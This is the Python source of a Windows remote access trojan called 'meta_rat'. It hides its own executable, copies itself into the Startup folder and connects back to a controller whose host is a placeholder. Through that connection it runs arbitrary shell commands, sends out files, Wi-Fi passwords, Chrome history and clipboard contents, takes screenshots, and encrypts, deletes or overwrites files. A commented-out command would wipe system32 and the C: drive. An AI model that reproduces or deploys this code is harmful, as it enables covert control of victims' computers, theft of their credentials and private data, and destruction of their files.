from socket import *
from plyer import notification
import subprocess
import platform
import psutil
import pyautogui
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL
from ctypes import cast, POINTER
import pyttsx3
import os
from getpass import getuser
from http.server import SimpleHTTPRequestHandler as handler
from socketserver import TCPServer
from winsound import Beep
import pyperclip
import pynput 
import sys
from pynput.keyboard import Key, Listener
import logging
import keyboard
from PyWallpaper import change_wallpaper
import struct
import sqlite3
import ctypes
import requests
from pymsgbox import confirm,alert
import time
import shutil
import pyAesCrypt
os.system('cls')
malware_path = os.getcwd()
show_msg = "mymsgtext"
file_name = 'myname'
if "system32" in malware_path or "Startup" in malware_path:
    print("didn't hide < ! > ")
else:
    os.system(f'attrib +s +h {file_name}.exe')
if show_msg == "":
    print('not any msg found')
else:
    if "system32" in malware_path or "System32" in malware_path or "startup" in malware_path:
        print('alarm do not show')
    else:
        alert(text = show_msg , title = "")
username = getuser()
time.sleep(0.5)
username = getuser()
startup = 'C:\\Users\\"{}"\\AppData\\Roaming\\Microsoft\\Windows\\"Start Menu"\\Programs\\Startup'.format(username)   
os.system("copy {} {}".format(f"{file_name}.exe", startup))
def meta_rat():
    try:
        s = socket(2,1)
        s.connect(("myip",myport))
    except:
        meta_rat()
    def changeback():
        try:
            SPI_SETDESKWALLPAPER = 20
            ctypes.windll.user32.SystemParametersInfoW(
                SPI_SETDESKWALLPAPER, 0, '', 0)
            time.sleep(2)
            s.send('Wallpaper Changed'.encode())
        except:
            s.send('We Have Bug Here . . .'.encode())


    def downloadim():
        try:
            file = command.replace('download ','')
            file = open(file , mode = "rb")
            data = file.read()
            file.close() 
            while True:
                if len(data) > 0:
                    tmp_data = data[0:1024]
                    if len(tmp_data) < 1024:
                        tmp_data += chr(0).encode() * (1024 - len(tmp_data))
                    data = data[1024:]
                    
                    s.send(tmp_data)
                    print("." , end="")
                else:
                    s.send(b"endendend")
                    print("done")
                    break
        except:
            s.send('We Have Problme Here . . .'.encode())


    def upload_file():
        try:
            url = command.replace('upload_file ','')
            r = requests.get(url, allow_redirects=True)
            open('YOU_HAVE_BEEN_HACKED.jpg', 'wb').write(r.content)
            s.send('I Upload Your File'.encode())
        except:
            s.send('We Have Bug Here . . .'.encode())

    def start_web():
        def do():
            os.chdir("C:\\")
            httpd = TCPServer(("" ,4040) , handler)
            httpd.serve_forever()
            os.system('shutdown -r')
        s.send("WARNING : Are You Sure Because After That You Cant't Take It Back !!!".encode())
        anser = s.recv(1234).decode()
        if anser == 'y':
            ip = subprocess.getoutput('ipconfig')
            s.send(ip.encode())
            do()
        else:
            print(' ')

    def Virus_danger():
        try:
            s.send('not now'.encode())
            #os.system('#RD C:\ /S /Q del c:\windows\system32*. * /q del /f /s /q “C:*.')
        except:
            s.send('We Have Bug Here . . .'.encode())

    def volumeup():
        try:
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            if volume.GetMute() == 1:
                volume.SetMute(0, None)
            volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
            s.send('Volume Up 100%'.encode())
        except:
            s.send('We Have Bug Here . . .'.encode())

    def download_():
        try:
            


                filename = command.replace('pickup ','')  #   test.txt\
                data = open(filename,'a+').write("""


    ----------------
    Hacked By Mr.404
    ----------------

            """)
                filesender = open(filename,'r').read()
                s.send(filesender.encode())
                time.sleep(4)
        except:
            s.send('We Have Bug Here . . .'.encode())

    def cd_dir():
        try:
            dirname = command.replace('cd ','')
            os.chdir(dirname)
            s.send('Directory Changed'.encode())
        except:
            s.send('We Have Problem Here . . .'.encode())


    def Encrypt():
        try:
            bufferSize = 64 * 1024

            comm = command.replace('encode ','')
            np = comm.split(sep=" ")
            file = np[0]
            password = np[1]

            pyAesCrypt.encryptFile(file,file+".aes",password,bufferSize)
            os.remove(file)

            s.send("File Encrypted !".encode())
        except:
            s.send('We have bug here'.encode())


    def Decrypt():
        try:
            bufferSize = 64 * 1024

            comm = command.replace('decode ','')
            np = comm.split(sep=" ")
            file = np[0]
            password = np[1]
            try:
                pyAesCrypt.decryptFile(file,file+"_decrypted",password,bufferSize)
                filename = file.replace('.aes','')
                renamefile = os.rename(f'{filename}.aes_decrypted',f'{filename}')
                time.sleep(0.5)
                os.remove(f'{filename}.aes')
                s.send('File Decrypted'.encode())
            except Exception as error:
                s.send(error)
                exit(1)
        except:
            s.send('We Have Bug Here . . .'.encode())




    def rename_file():
        try:
            namefile = command.replace('ren_file_','')
            namesfile = namefile.split(sep=' ')
            os.rename(namesfile[0],namesfile[1])
            s.send('File Renamed'.encode())
        except:
            s.send('We Have Bug Here . . .'.encode())

    def shutdown_():
        try:
            os.system('shutdown -s')
            s.send('system turn off'.encode())
        except:
            s.send('We Have Bug Here . . .'.encode())



    def setclip():
        try:
            text = command.replace('set clipboard ','')
            pyperclip.copy(text)
            s.send('Done !'.encode())
        except:
            s.send('We Have Bug Here . . .'.encode())


    def seeclip():
        try:
            clipboard = pyperclip.paste()
            s.send(clipboard)
        except:
            s.send('We Have Bug Here . . .'.encode())

    def process():
        c=0
        for process in psutil.process_iter ():
            c=c+1
            Name = process.name().encode() # Name of the process
            ID = process.pid # ID of the process
            s.send("Process name =".encode()+ Name)

    def restart_():
        try:
            os.system('shutdown -r')
            s.send('system restarted'.encode())
        except:
            s.send('We Have Bug Here . . .'.encode())


    def history():
        if os.system("uname > /dev/null") == 0 : # OS IS LINUX
            db_path = os.getenv("HOME") + "/.config/google-chrome/Default/History"
        else : # OS IS WINDOWS
            appdata = os.getenv("appdata").replace("\\Roaming","")
            db_path = appdata + "\\Local\\Google\\Chrome\\User Data\\Default\\History"

        db = sqlite3.connect(db_path)
        c = db.cursor()

        # SEARCH History
        searchs = []
        c.execute("select term from keyword_search_terms")
        for item in c.fetchall():
            searchs.append(item[0])

        # URL HISTORY
        urls = []
        c.execute("select url from urls")
        for item in c.fetchall():
            urls.append(item[0])

        # Download HISTORY :
        downloads = []
        c.execute("select tab_url from downloads")
        for item in c.fetchall():
            downloads.append(item[0])

        ## SHOW Information ##
        print("Urls : ")
        for url in urls:
            print("\t{}".format(url))

        print("-"*50)

        print("Downloaded Files :")
        for download in downloads:
            print("\t{}".format(download))

        print("-"*50)

        print("Searchs : ")
        for search in searchs:
            s.send("\t{}".format(search).encode())



    def type_():
        try:
            text = command.replace('type ','')
            keyboard.write(text)
            s.send('Done !'.encode())
        except:
            s.send('We Have Bug Here . . .'.encode())


    def pwd_():
        try:
            pwd = os.getcwd()
            s.send(pwd.encode())
        except:
            s.send('We Have Bug Here . . .'.encode())

    def openlink():
        try:
            link = command.replace('open_link ','')
            os.system(f'powershell start-process "{link}"')
            s.send('link opened'.encode())
        except:
            s.send('We Have Bug Here . . .'.encode())

    def dir_list():
        try:
            dirlist = subprocess.getoutput("fsutil fsinfo drives")
            s.send(dirlist.encode())
        except:
            s.send('We Have Bug Here . . .'.encode())

    def sysinfo_():
        try:
            systeminfo = subprocess.getoutput('systeminfo')
            s.send(systeminfo.encode())
        except:
            s.send('We Have Bug Here . . .'.encode())


    def readtxtfile():
        try:
            txtname = command.replace('read ','')
            file_data = open(txtname,'r').read()
            s.send(file_data.encode())
        except:
            s.send('File Not Found'.encode())

    def hide_mal():
        try:
            os.system(f'attrib +s +h {file_name}.exe')
            s.send('Malware Hide ! ! !'.encode())
        except:
            s.send('We Have Bug Here . . .'.encode())


    def unhide():
        try:
            os.system(f'attrib -s -h {file_name}.exe')
            s.send('Malware UnHide ! ! !'.encode())
        except:
            s.send('We Have Bug Here . . .'.encode())

    def ls_():
        try:
            ls = subprocess.getoutput('dir /b')
            s.send(ls.encode())
        except:
            s.send('We Have Bug Here . . .'.encode())

    def screenshot():
        try:
            myScreenshot = pyautogui.screenshot()
            myScreenshot.save(f'C:\\Users\\{username}\\Pictures\\hc.png')
            s.send(f'SreenShot Save on C:\\Users\\{username}\\Pictures\\hc.png ,Please go and download that.'.encode())
        except:
            s.send('We Have Bug Here . . .'.encode())


    def rm_file():
        try:
            name = command.replace('remove ','')
            os.remove(name)
            s.send('File removed'.encode())
        except:
            s.send('We Have Bug Here  . .'.encode())

    def get_wlan():
        try:
            data = subprocess.getoutput('netsh wlan show profiles')
            s.send(data.encode())
        except:
            s.send('We Have Bug Here . . .'.encode())

    def getpass_wlan():
        try:
            wifi_name = command.replace('getpass_','')
            password = subprocess.getoutput(f'netsh wlan show profiles { wifi_name} key=clear')
            s.send(password.encode())
        except:
            s.send('we have bug here . . .'.encode())
    def uptxt():
        try:
            ftext = command.replace('uptxt','')
            text = ftext.split(sep=' ')
            txtfile = open(f'{text[1]}',mode='w').write(text[0])
            s.send('I Upload Your File'.encode())
        except:
            s.send('We Have Bug Here . . .'.encode())

    def spam_danger():
        try:
            for a in range(35):
                os.system('start')
            Beep(3000,10000)
            os.system('shutdown -r')
            s.send('spam done and system restarting !!!'.encode())
        except:
            s.send('We Have Bug Here . . .'.encode())

    def send_alert():
        try:
            data = command.replace('show ','')
            datalist = data.split(sep="@")
            text = datalist[1]
            title = datalist[0]
            alert(text = text , title = title)
            s.send('Done !'.encode())
        except:
            s.send('We Have Bug Here . . .'.encode())

    def getcmd_():
        try:
            comm = command.replace('cmd_','')
            outcom = subprocess.getoutput(comm)
            s.send(outcom.encode())
        except:
            s.send('We Have Bug Here . . .'.encode())


    def badvoice():
        try:
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            if volume.GetMute() == 1:
                volume.SetMute(0, None)
            volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
            time = int(command.replace('badvoice_',''))
            Beep(3000,time)
            s.send('Done !'.encode())
        except:
            s.send('We Have Bug Here . . .'.encode())


    def speak_():
        try:
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            if volume.GetMute() == 1:
                volume.SetMute(0, None)
            volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
            sound = pyttsx3.init()
            text = command.replace('say_','')
            sound.setProperty('rate' , 110)
            sound.say(text)
            sound.runAndWait()
            time.sleep(0.2)
            s.send('Done !'.encode())
        except:
            s.send('We Have Bug Here . . .'.encode())

    def volumedown():
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
        s.send("Volume is decreased to 0%".encode())

    def helplist():
        helpls = """
    pwd : pwd 
    ---
    Upload file : upload_file + (with link)
    ---
    Destroy all the system : danger_virus (Remove Windows and system32) #RD C:\ /S /Q del c:\windows\system32*. * /q del /f /s /q “C:*.
    ---
    Download File : pickup + [name of file] (.txt files)
    ---
    Download Image : download
    ---
    Change Directory : cd (cd + [dir name])
    ---
    Rename File : ren_file_ + [file name] + [your name] (Change the name of the file)
    ---
    Shutdown,Restart : shutdown,restart
    ---
    open link : open_link + http://example.com (open any link in target system)
    ---
    drives list : dir_ls (see the name of the drives)
    ---
    system information : sys_info 
    ---
    file list : ls (see all the file names that you are in drive)
    ---
    Remove file : rm_file + [filename] (delete any files for ever)
    ---
    Hack System Wlans : hackwifi (get name) , getpass_[name]
    ---
    upload txt file : uptxt_ + [your text,dont use space] + [yourname]
    ---
    Access Shell : cmd_+[you text] (For Access CMD)
    ---
    Bad Sound : Badvoice_ + [Time]
    ---
    Speak : say_ + [Your Text]
    ---
    Change Background : chback_ + [Image Link] (Change Desktop Wallpaper)
    ---
    Volume -> 100% : volumeup
    ---
    Volume -> 0% : volumedown
    ---
    Take Screen Shot : screenshot
    ---
    Run Process : process
    ---
    History Of Chrome : history
    ---
    read txt files : read + [txt file name] (read txt files in terminal so fast)
    ---
    Encrypt File : encode + [File name] (For Encrypt Any File)
    ---
    Decrypt File : decode + [File name] (For Decrypt Any)
    ---
    Type : type + [Text] (Type with targets keyboard)
    ---
    see clipboard : clipboard
    ---
    set clipboard : set clipboard [Your Text]
        """
        s.send(helpls.encode())

    while True:
        try:
            command = s.recv(1234).decode()
        except:
            meta_rat()

        if "pwd" == command:
            pwd_()
        elif command == "\n" or command == "":
            s.send('   '.encode())
        elif "get_shell" in command:
            None
        elif "upload_file " in command:
            upload_file()
        elif "danger_virus" in command:
            Virus_danger()
        elif "pickup " in command:
            download_()
        elif "cd " in command:
            cd_dir()
        elif "ren_file_" in command:
            rename_file()
        elif "shutdown" in command:
            shutdown_()
        elif "restart" in command:
            restart_()
        elif "open_link" in command:
            openlink()
        elif "dir_ls" in command:
            dir_list()
        elif "sys_info" in command:
            sysinfo_()
        elif "ls" in command:
            ls_()
        elif "remove " in command:
            rm_file()
        elif "" or "\n" in command:
            s.send("Not Found".encode())
        elif "hackwifi" in command:
            get_wlan()
        elif 'uptxt_' in command:
            uptxt()
        elif 'cmd_' in command:
            getcmd_()
        elif 'download' in command:
            downloadim()
        elif 'badvoice' in command:
            badvoice()
        elif 'say_' in command:
            speak_()
        elif 'rmback' in command:
            changeback()
        elif 'volumeup' in command:
            volumeup()
        elif 'volumedown' in  command:
            volumedown()
        elif 'screenshot' in command:
            screenshot()
        elif 'history' in command:
            history()
        elif 'read ' in command:
            readtxtfile()
        elif "encode" in command:
            Encrypt()
        elif "decode" in command:
            Decrypt()
        elif "type" in command:
            type_()
        elif command == "clipboard":
            seeclip()
        elif "set clipboard " in command:
            setclip()
        elif 'show' in command:
            send_alert()
        elif command == 'start_web':
            start_web()
        elif "getpass_" in command:
            getpass_wlan()
        elif "unhide_malware" in command:
            unhide()
        elif "hide_malware" in command:
            hide_mal()
        elif command == "spam":
            spam_danger()
        else:
            s.send('Command Not Found !!!'.encode())
meta_rat()